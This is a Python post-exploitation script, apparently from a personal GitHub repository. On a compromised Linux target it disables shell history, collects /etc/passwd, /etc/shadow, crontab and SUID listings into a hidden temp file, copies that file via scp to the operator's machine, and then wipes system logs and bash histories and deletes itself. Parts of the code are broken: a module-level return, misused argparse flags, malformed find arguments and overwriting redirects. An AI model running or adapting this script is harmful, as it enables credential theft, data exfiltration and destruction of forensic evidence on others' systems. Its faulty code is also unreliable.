#!/usr/env/python3
# author: suffs811 github: https://github.com/cysec11/scripts
# python script for catting /etc files, saving them to file,
# sending them to local system,
# and deleting history/script from target machine.

import os
import platform
import argparse


# get arguments for IP and password
parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks")
parser.add_argument("-i", "--ip", help="specify local IP to scp (secure copy) data file to", action="store_true", required="True")
parser.add_argument("-p", "--password", help="specify user password if know", action="store_true")
args = parser.parse_args()
local_path = args.ip 
password = args.password


def extract_clear(local_path):
    # confirm user wants to permanently delete logs and alter bach environment variables
    print("this script will permanently delete logs and alter bash envs...")
    print("do you want to gather system data and export it to local machine?")
    answer = input("(yes/no): ")

    if answer == "no":
        return
    elif answer == "yes":
        # get local machine ip
        local_path = input("local IP and file save path (10.0.0.1/home/file.txt): ")

        # disable history logging
        print("\ndisabling history logging...")
        os.system("unset HISTFILE")
        os.system("export HISTSIZE=0")
        os.system("export HISTFILESIZE=0")
        os.system("export HISTFILE=/dev/null")
        os.system("set +o history")

        # create file to write data to
        os.system("cd /tmp/&&mkdir .data&&cd .data&&touch data_exfil.txt")

        # write data to file
        print("### exfiltrating data... ###")

        print("\n### system info (not writing to file): ###")
        my_system = platform.uname()
        print(f"system: {my_system.system}")
        print(f"node name: {my_system.node}")
        print(f"release: {my_system.release}")
        print(f"version: {my_system.version}")
        print(f"machine: {my_system.machine}")
        print(f"processor: {my_system.processor}")

        # get system info and write to data file
        print("")
        os.system("id > /tmp/data_exfil.txt")
        os.system("whoami > /tmp/data_exfil.txt")
        os.system("netstat -tnpl > /tmp/data_exfil.txt")
        os.system("id")
        os.system("whoami")
        os.system("netstat -tnpl")

        print("\n### /etc/passwd: ###")
        os.system("cat /etc/passwd >> /tmp/data_exfil.txt")
        os.system("cat /etc/passwd")

        print("\n### /etc/shadow: ###")
        os.system("cat /etc/shadow >> /tmp/data_exfil.txt")
        os.system("cat /etc/shadow")

        print("\n### /etc/hosts: ###")
        os.system("cat /etc/hosts")
        os.system("cat /etc/hosts")

        print("\n### /etc/crontab: ###")
        os.system("cat /etc/crontab >> /tmp/data_exfil.txt")
        os.system("cat /etc/crontab")

        print("\n### /etc/exports: ###")
        os.system("cat /etc/exports >> /tmp/data_exfil.txt")
        os.system("cat /etc/exports")

        print("\n### SUID files: ###")
        os.system("find / type -f perm /4000 2>/dev/null >> /tmp/data_exfil.txt")
        os.system("find / type -f perm /4000 2>/dev/null")

        # exfil the data file to local machine
        os.system(f"scp /tmp/data_exfil.txt root@{local_path}]")
        print(f"\n*** data_exfil.txt sent to {local_path} ***")
        return
    else:
        print("didn't write yes or no!!!")
        extract_clear()


# detect if pwd was given as option, if so, run sudo -l
if args.password:
    def cred_info(password):
        cred = input("do you know user's passwd? (yes/no): ")
        if cred == "no":
            return
        elif cred == "yes":
            passwd = input("passwd: ")
            print("\n### running sudo -l: ###")
            os.system(f"timeout -k 3 3 sudo -l -S {password}")
            return
        else:
            cred_info()
else:
    return


# ask to clear logs and delete script from local machine
def delete_file():
    print("\ndo you want to delete the logs and this script?")
    answer_2 = input("(yes/no): ")
    if answer_2 == "no":
        print("good luck!")
        return
    elif answer_2 == "yes":
        # delete logs and this script from target machine
        print("\n### clearing log files ###")
        os.system("echo ' ' > /var/log/auth.log")
        os.system("echo ' ' > /var/log/cron.log")
        os.system("echo ' ' > /var/log/maillog")
        os.system("echo ' ' > /var/log/httpd")
        os.system("history -c")
        os.system("history -w")
        os.system("echo ' ' > ~/.bash_history")
        os.system("echo ' ' > /root/.bash_history")

        print("\n### deleting data file and script... ###")
        os.system("rm -rf /tmp/.data")
        os.system("rm -f exfil.py")
        return
    else:
        print("didn't write yes or no!!!")
        delete_file()


extract_clear(local_path)
cred_info(password)
delete_file()
